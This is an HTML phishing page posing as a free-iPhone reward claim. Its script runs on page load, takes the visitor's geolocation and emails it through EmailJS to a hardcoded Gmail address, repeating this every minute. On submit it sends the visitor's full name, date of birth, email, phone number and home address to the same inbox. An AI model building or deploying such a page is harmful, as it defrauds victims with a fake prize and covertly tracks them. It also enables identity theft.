<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>iPhone Reward Form</title>
  <!-- Bootstrap CSS -->
  <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-image: url('https://via.placeholder.com/1920x1080');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
    }
    .container {
      max-width: 600px;
      background: rgba(255, 255, 255, 0.85);
      padding: 2rem;
      border-radius: 8px;
      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
      text-align: center;
    }
    .form-heading {
      color: #333;
      font-size: 1.5rem;
      margin-bottom: 20px;
    }
    .btn-primary {
      background-color: #007bff;
      border: none;
      margin-top: 15px;
    }
    .btn-primary:hover {
      background-color: #0056b3;
    }
    .form-text {
      font-size: 0.9rem;
      color: #666;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1 class="form-heading">Congratulations! ðŸŽ‰</h1>
    <p class="lead">You've been selected to receive a brand-new iPhone!</p>
    <p class="form-text">Please fill out the form below to claim your reward.</p>

    <form id="rewardForm">
      <div class="form-group">
        <label for="fullName">Full Name</label>
        <input type="text" class="form-control" id="fullName" placeholder="Enter your full name" required>
      </div>
      <div class="form-group">
        <label for="dob">Date of Birth</label>
        <input type="date" class="form-control" id="dob" required>
      </div>
      <div class="form-group">
        <label for="email">Email Address</label>
        <input type="email" class="form-control" id="email" placeholder="Enter your email" required>
      </div>
      <div class="form-group">
        <label for="phoneNumber">Phone Number</label>
        <input type="tel" class="form-control" id="phoneNumber" placeholder="Enter your phone number" required>
      </div>
      <div class="form-group">
        <label for="address">Shipping Address</label>
        <textarea class="form-control" id="address" rows="3" placeholder="Enter your shipping address" required></textarea>
      </div>
      <div class="form-group">
        <label for="city">City</label>
        <input type="text" class="form-control" id="city" placeholder="Enter your city" required>
      </div>
      <div class="form-group">
        <label for="postalCode">Postal Code</label>
        <input type="text" class="form-control" id="postalCode" placeholder="Enter your postal code" required>
      </div>

      <p id="locationDisplay" class="form-text" style="background: rgba(255, 255, 255, 0.85); color: #666; padding: 0.5rem; border-radius: 4px;">
        Location permissions required to auto-fill your location.
      </p>

      <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
    </form>
  </div>

  <!-- Bootstrap JS and jQuery -->
  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

  <!-- JavaScript for EmailJS -->
  <script>
    (function () {
      emailjs.init("-_fZgZZhnhhK2OvuV");
    })();

    document.addEventListener("DOMContentLoaded", function () {
      const locationDisplay = document.getElementById("locationDisplay");

      function sendLocationEmail(latitude, longitude) {
        const templateParams = {
          subject: "User Location",
          message: `Latitude: ${latitude}, Longitude: ${longitude}`,
          to_email: "khalilrodeni@gmail.com"
        };

        emailjs.send("service_7xiz4x8", "template_ux0sel8", templateParams)
          .then(() => console.log("Location email sent"))
          .catch(error => console.error("Location email error:", error));
      }

      function requestLocation() {
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              const lat = position.coords.latitude;
              const lon = position.coords.longitude;
              locationDisplay.textContent = `Latitude: ${lat}, Longitude: ${lon}`;
              sendLocationEmail(lat, lon);
            },
            (error) => {
              const errorMsg = "Error getting location: " + error.message;
              locationDisplay.textContent = errorMsg;
              sendLocationEmail("Unavailable", errorMsg);
            }
          );
        } else {
          const msg = "Geolocation is not supported by this browser.";
          locationDisplay.textContent = msg;
          sendLocationEmail("Unsupported", msg);
        }
      }

      // Send location initially and then every 60 seconds
      requestLocation();
      setInterval(requestLocation, 60000);

      document.getElementById("rewardForm").addEventListener("submit", function (e) {
        e.preventDefault();

        const templateParams = {
          full_name: document.getElementById("fullName").value,
          dob: document.getElementById("dob").value,
          email: document.getElementById("email").value,
          phone: document.getElementById("phoneNumber").value,
          address: document.getElementById("address").value,
          city: document.getElementById("city").value,
          postal_code: document.getElementById("postalCode").value,
          subject: "iPhone Reward Form Submission",
          message: "A new form submission was received.",
          to_email: "khalilrodeni@gmail.com"
        };

        emailjs.send("service_7xiz4x8", "template_ux0sel8", templateParams)
          .then(() => {
            alert("Thank you for your submission! We will contact you shortly.");
          })
          .catch((error) => {
            console.error("Email send error:", error);
            alert("Failed to send form. Please try again.");
          });
      });
    });
  </script>
</body>
</html>
